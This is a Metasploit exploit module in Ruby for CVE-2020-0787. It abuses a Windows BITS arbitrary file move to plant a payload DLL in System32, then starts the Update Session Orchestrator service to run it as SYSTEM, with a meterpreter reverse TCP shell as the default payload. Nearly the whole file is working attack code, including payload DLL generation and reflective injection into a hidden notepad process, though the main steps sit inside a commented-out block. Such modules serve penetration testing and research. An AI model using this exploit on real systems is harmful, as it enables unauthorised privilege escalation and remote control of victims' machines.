##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/exploit/exe'
require 'msf/core/post/windows/filesystem'
require 'msf/core/exploit/file_dropper'
require 'msf/core/post/file'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::Windows::Priv
  include Msf::Exploit::EXE # Needed for generate_payload_dll
  include Msf::Post::Windows::FileSystem
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Exploit::FileDropper
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Background Intelligent Transfer Service Arbitrary File Move Privilege Elevation Vulnerability',
        'Description' => %q{
          This module exploits CVE-2020-0787, an arbitrary file move vulnerability in outdated versions of the
          Background Intelligent Transfer Service (BITS), to overwrite C:\Windows\System32\WindowsCoreDeviceInfo.dll
          with a malicious DLL containing the attacker's payload.

          To achieve code execution as the SYSTEM user, the Update Session Orchestrator service is then started, which
          will result in the malicious WindowsCoreDeviceInfo.dll being run with SYSTEM privileges due to a DLL hijacking
          issue within the Update Session Orchestrator Service.

          Note that presently this module only works on Windows 10 and later as the Update Session Orchestrator Service
          was only introduced to Windows starting with Windows 10.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'itm4n', # PoC
            'gwillcox-r7' # msf module
          ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Targets' =>
          [
            [ 'Windows DLL Dropper', { 'Arch' => [ARCH_X86, ARCH_X64], 'Type' => :windows_dropper } ],
          ],
        'DefaultTarget' => 0,
        'DisclosureDate' => 'Mar 10 2020',
        'References' =>
          [
            ['CVE', '2020-0787'],
            ['URL', 'https://itm4n.github.io/cve-2020-0787-windows-bits-eop/'],
            ['URL', 'https://github.com/itm4n/BitsArbitraryFileMove'],
            # TO DO: UPDATE THIS WITH ATTACKERKB ASSESSMENT
            # ['URL', '*TO UPDATE WITH ATTACKER KB ASSESSMENT'],
            ['URL', 'https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html']
          ],
        'Notes' =>
          {
            'SideEffects' => [ ARTIFACTS_ON_DISK ]
          },
        'DefaultOptions' =>
          {
            'DisablePayloadHandler' => false,
            'EXITFUNC' => 'thread',
            'Payload' => 'windows/x64/meterpreter/reverse_tcp',
            'WfsDelay' => 900
          }
      )
    )

    register_options([
      OptBool.new('OVERWRITE_DLL', [true, 'Overwrite WindowsCreDeviceInfo.dll if it exists (false by default).', false]),
      OptInt.new('JOB_WAIT_TIME', [true, 'Time to wait for the BITS job to complete before starting the USO service to execute the uploaded payload, in seconds', 60])
    ])
  end

  def check_target_is_running_windows_10
    if sysinfo['OS'].match('Windows').nil?
      fail_with(Failure::NotVulnerable, 'Target is not running Windows!')
    elsif sysinfo['OS'].match('Windows 10').nil?
      fail_with(Failure::BadConfig, "Target is running Windows, but not Windows 10! We currently can't trigger the LPE part of this exploit on systems other than Windows 10. Exiting...")
    end
  end

  def check_payload_arch_supported_and_matches_target_arch
    client_arch = sysinfo['Architecture']
    payload_arch = payload.arch.first # TODO: Add missing documentation for payload.arch, @wvu used this first but it is not documented anywhere.
    if (payload_arch != ARCH_X64) && (payload_arch != ARCH_X86)
      fail_with(Failure::BadConfig, "Unsupported payload architecture (#{payload_arch})") # Unsupported architecture, so return an error.
    end
    if ((client_arch == ARCH_X64) && (payload_arch != ARCH_X64)) || ((client_arch == ARCH_X86) && (payload_arch != ARCH_X86))
      fail_with(Failure::BadConfig, "Payload architecture (#{payload_arch}) doesn't match the architecture of the target (#{client_arch})!")
    end
  end

  def check_windowscoredeviceinfo_dll_exists_on_target
    # Taken from zeroSteiner's SMBGhost module:
    if sysinfo["Architecture"] =~ /wow64/i
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
    end


    # Taken from bwatters-r7's cve-2020-0688_service_tracing.rb code.
    #
    # We are going to overwrite the WindowsCoreDeviceInfo.dll DLL as part of our exploit.
    # The second part of this exploit will trigger a Update Session to be created so that this DLL
    # is loaded, which will result in arbitrary code execution as SYSTEM.
    #
    # To prevent any errors, we will first check that this file doesn't exist and ask the user if they are sure
    # that they want to overwrite the file.
    win_dir = session.sys.config.getenv('windir')
    normal_target_payload_pathname = "#{win_dir}\\System32\\WindowsCoreDeviceInfo.dll"
    wow64_target_payload_pathname = "#{win_dir}\\Sysnative\\WindowsCoreDeviceInfo.dll"
    wow64_existing_file = "#{win_dir}\\Sysnative\\win32k.sys"
    if file?(wow64_existing_file)
      if file?(wow64_target_payload_pathname)
        print_warning("#{wow64_target_payload_pathname} already exists")
        print_warning('If it is in use, the overwrite will fail')
        unless datastore['OVERWRITE_DLL']
          print_error('Change OVERWRITE_DLL option to true if you would like to proceed.')
          fail_with(Failure::BadConfig, "#{wow64_target_payload_pathname} already exists and OVERWRITE_DLL option is false")
        end
        target_payload_pathname = wow64_target_payload_pathname
      end
    elsif file?(normal_target_payload_pathname)
      print_warning("#{normal_target_payload_pathname} already exists")
      print_warning('If it is in use, the overwrite will fail')
      unless datastore['OVERWRITE_DLL']
        print_error('Change OVERWRITE_DLL option to true if you would like to proceed.')
        fail_with(Failure::BadConfig, "#{normal_target_payload_pathname} already exists and OVERWRITE_DLL option is false")
      end
      target_payload_pathname = normal_target_payload_pathname
    end
    return target_payload_pathname
  end

  def launch_background_injectable_notepad
    begin
      print_status('Launching notepad to host the exploit...')
      notepad_process = client.sys.process.execute('notepad.exe', nil, 'Hidden' => true)
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      # Sandboxes could not allow to create a new process
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_error('Operation failed. Trying to elevate the current process...')
      process = client.sys.process.open
    end
    process
  end

  def exploit
    # Step 1: Check target environment is correct.
    print_status("Step #1: Checking target enviroment...")
    check_target_is_running_windows_10
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end
    check_payload_arch_supported_and_matches_target_arch
    check_windowscoredeviceinfo_dll_exists_on_target

=begin
    # Step 2: Generate the malicious DLL and upload it to a temp location.
    print_status("Step #2: Generating the malicious DLL...")
    payload_dll = generate_payload_dll
    print_status("Payload DLL is #{payload_dll.length} bytes long")
    temp_directory = session.sys.config.getenv('%TEMP%')
    malicious_dll_location = "#{temp_directory}\\" + Rex::Text.rand_text_alpha(6..13) + ".dll"
    write_file(malicious_dll_location, payload_dll)
    register_file_for_cleanup(malicious_dll_location)


    # Step 3: Load the main DLL that will trigger the exploit and conduct the arbitrary file copy.
    print_status("Step #3: Loading the exploit DLL to run the main exploit...")
    process = launch_background_injectable_notepad

    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    if sysinfo["Architecture"] =~ /x86/i
      library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2020-0787', 'CVE-2020-0787.x86.dll')
      library_path = ::File.expand_path(library_path)
      uso_library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'uso_trigger', 'uso_trigger.x86.dll')
      uso_library_path = ::File.expand_path(uso_library_path)
    elsif sysinfo["Architecture"] =~ /x64/i
      library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2020-0787', 'CVE-2020-0787.x64.dll')
      library_path = ::File.expand_path(library_path)
      uso_library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'uso_trigger', 'uso_trigger.x64.dll')
      uso_library_path = ::File.expand_path(uso_library_path)
    else
      fail_with(Failure::NoTarget, "Target architecture is #{sysinfo['Architecture']} which isn't supported!")
    end

    print_status("Injecting DLL into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)

    dllInfoParameter = "#{malicious_dll_location}"
    payload_mem = inject_into_process(process, dllInfoParameter)

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status('DLL injected. Executing injected DLL...')
    process.thread.create(exploit_mem + offset, payload_mem)

    print_status("Sleeping for #{datastore['JOB_WAIT_TIME']} seconds to allow the exploit to run...")
    sleep datastore['JOB_WAIT_TIME']

    # Step 4: Starting USO DLL to trigger the payload
    print_status('Step #4: Attempting to start the USO service to trigger the payload...')
    dll = ''
    ::File.open(uso_library_path, 'rb') { |f| dll = f.read }
    uso_exploit_mem, uso_offset = inject_dll_data_into_process(process, dll)
    process.thread.create(uso_exploit_mem + uso_offset)

    # Final step: Reminder user to clean up some parts
    print_status("Remember to migrate to another SYSTEM process, then find the PID of usocoreworker.exe and delete it. Finally, delete the file at C:\\Windows\\System32\\WindowsCoreDeviceInfo.dll")
    print_status("Also be sure to delete #{temp_directory} and all files and folders underneath it!")
=end
  end
end
